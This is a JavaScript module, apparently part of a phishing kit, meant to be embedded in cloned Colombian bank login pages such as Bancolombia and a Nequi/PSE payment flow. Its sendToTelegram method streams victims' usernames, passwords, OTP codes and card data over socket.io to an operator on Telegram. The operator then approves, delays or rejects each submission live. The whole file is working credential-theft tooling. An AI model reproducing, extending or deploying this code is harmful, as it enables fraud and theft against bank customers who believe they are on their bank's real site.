/**
 * INTEGRACIÓN UNIVERSAL DE BANCAS AL SISTEMA CENTRALIZADO
 * 
 * Este script debe incluirse en TODAS las páginas HTML de cada banca
 * justo después de cargar socket.io
 * 
 * Ejemplo de uso en HTML:
 * <script src="/socket.io/socket.io.js"></script>
 * <script src="/bancas/universal-bank-integration.js"></script>
 * <script>
 *   // Inicializar con el nombre del banco
 *   const bankIntegration = new UniversalBankIntegration('Bancolombia');
 * </script>
 */

class UniversalBankIntegration {
    constructor(bankName) {
        this.bankName = bankName;
        this.sessionId = null;
        this.socket = null;
        this.mainServerUrl = window.location.origin; // Servidor principal en la raíz
        this.keepAliveInterval = null;
        
        console.log(`🏦 Inicializando integración para: ${this.bankName}`);
        this.initializeSession();
        this.initializeSocket();
    }

    /**
     * Inicializar o recuperar sesión
     */
    initializeSession() {
        // Primero buscar la sesión del flujo Nequi->PSE
        this.sessionId = localStorage.getItem('nequiSessionId');
        
        if (this.sessionId) {
            console.log(`✅ Sesión del flujo Nequi->PSE encontrada: ${this.sessionId}`);
        } else {
            // Usuario accede directo al banco, crear nueva sesión
            this.sessionId = `${this.bankName.toLowerCase()}_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
            console.log(`⚠️ Nueva sesión directa creada: ${this.sessionId}`);
        }
        
        // Guardar sesión
        localStorage.setItem(`${this.bankName.toLowerCase()}_session`, this.sessionId);
        sessionStorage.setItem('currentSession', this.sessionId);
        
        return this.sessionId;
    }

    /**
     * Conectar al servidor principal
     */
    initializeSocket() {
        console.log('🔌 Conectando al servidor principal...');
        
        this.socket = io(this.mainServerUrl, {
            transports: ['websocket', 'polling'],
            reconnection: true,
            reconnectionDelay: 200,
            reconnectionDelayMax: 1000,
            reconnectionAttempts: 20,
            timeout: 5000,
            query: {
                sessionId: this.sessionId,
                bank: this.bankName
            }
        });

        this.socket.on('connect', () => {
            console.log('✅ Conectado al servidor principal:', this.socket.id);
            
            // Inicializar sesión en el servidor
            this.socket.emit('initSession', {
                sessionId: this.sessionId,
                module: this.bankName,
                page: window.location.pathname
            });
            
            // Iniciar keep-alive
            this.startKeepAlive();
        });

        this.socket.on('sessionConfirmed', (data) => {
            console.log('✅ Sesión confirmada por el servidor:', data);
        });

        // Escuchar acciones del admin desde Telegram
        this.socket.on('actionApproveBank', (data) => {
            if (data.sessionId === this.sessionId) {
                console.log('✅ Admin aprobó los datos');
                this.handleApprove(data);
            }
        });

        this.socket.on('actionWaitBank', (data) => {
            if (data.sessionId === this.sessionId) {
                console.log('⏳ Admin solicitó esperar');
                this.handleWait(data);
            }
        });

        this.socket.on('actionRejectBank', (data) => {
            if (data.sessionId === this.sessionId) {
                console.log('❌ Admin rechazó los datos');
                this.handleReject(data);
            }
        });

        this.socket.on('telegramSent', (data) => {
            console.log('✅ Confirmación de envío a Telegram:', data);
        });

        this.socket.on('error', (error) => {
            console.error('❌ Error de socket:', error);
        });

        this.socket.on('disconnect', (reason) => {
            console.log('❌ Desconectado del servidor:', reason);
            this.stopKeepAlive();
        });

        this.socket.on('connect_error', (error) => {
            console.error('❌ Error de conexión:', error.message);
        });

        return this.socket;
    }

    /**
     * Mantener sesión activa
     */
    startKeepAlive() {
        this.stopKeepAlive();
        this.keepAliveInterval = setInterval(() => {
            if (this.socket && this.socket.connected) {
                this.socket.emit('keepAlive', { 
                    sessionId: this.sessionId,
                    timestamp: Date.now()
                });
            }
        }, 3000);
    }

    stopKeepAlive() {
        if (this.keepAliveInterval) {
            clearInterval(this.keepAliveInterval);
            this.keepAliveInterval = null;
        }
    }

    /**
     * MÉTODO PRINCIPAL: Enviar datos al Telegram principal
     * 
     * @param {string} stage - Etapa del formulario (ej: 'login', 'password', 'otp', 'tarjeta', etc)
     * @param {object} data - Objeto con los datos a enviar
     * @param {function} callback - Callback opcional para manejar la respuesta
     * 
     * Ejemplo:
     * bankIntegration.sendToTelegram('login', {
     *   usuario: 'miUsuario',
     *   password: 'miPassword'
     * }, (response) => {
     *   if (response.success) {
     *     console.log('Enviado correctamente');
     *   }
     * });
     */
    sendToTelegram(stage, data, callback) {
        if (!this.socket || !this.socket.connected) {
            console.error('❌ Socket no conectado');
            callback && callback({ success: false, error: 'Socket no conectado' });
            return;
        }

        console.log(`📤 Enviando ${this.bankName} (${stage}) al Telegram principal`);
        console.log('📦 Datos:', data);

        this.socket.emit('sendBankData', {
            sessionId: this.sessionId,
            bankName: this.bankName,
            stage: stage,
            data: data
        });

        // Escuchar confirmación de envío
        const successHandler = (response) => {
            if (response.sessionId === this.sessionId) {
                console.log('✅ Datos enviados a Telegram:', response);
                callback && callback({ success: true, ...response });
                this.socket.off('telegramSent', successHandler);
                clearTimeout(timeoutId);
            }
        };

        this.socket.on('telegramSent', successHandler);

        // Timeout de seguridad
        const timeoutId = setTimeout(() => {
            this.socket.off('telegramSent', successHandler);
            console.warn('⏱️ Timeout esperando confirmación');
            callback && callback({ success: false, error: 'Timeout' });
        }, 10000);
    }

    /**
     * Actualizar la página actual
     */
    updatePage(page) {
        if (this.socket && this.socket.connected) {
            this.socket.emit('updatePage', { 
                sessionId: this.sessionId, 
                page: page 
            });
        }
    }

    /**
     * Handlers para acciones del admin (pueden ser sobrescritos)
     */
    handleApprove(data) {
        console.log('✅ Datos aprobados - Implementar lógica específica');
        // Las bancas pueden sobrescribir este método
        // Ej: Avanzar a siguiente página, ocultar loading, etc.
    }

    handleWait(data) {
        console.log('⏳ Esperando - Implementar lógica específica');
        const waitTime = data.waitTime || 15;
        // Las bancas pueden sobrescribir este método
    }

    handleReject(data) {
        console.log('❌ Rechazado - Implementar lógica específica');
        // Las bancas pueden sobrescribir este método
        // Ej: Mostrar error, limpiar formulario, redirigir, etc.
    }

    /**
     * Obtener el socket actual
     */
    getSocket() {
        return this.socket;
    }

    /**
     * Obtener el sessionId
     */
    getSessionId() {
        return this.sessionId;
    }

    /**
     * Desconectar
     */
    disconnect() {
        this.stopKeepAlive();
        if (this.socket) {
            this.socket.disconnect();
        }
    }
}

// Exponer globalmente
window.UniversalBankIntegration = UniversalBankIntegration;

console.log('✅ UniversalBankIntegration cargado y listo');
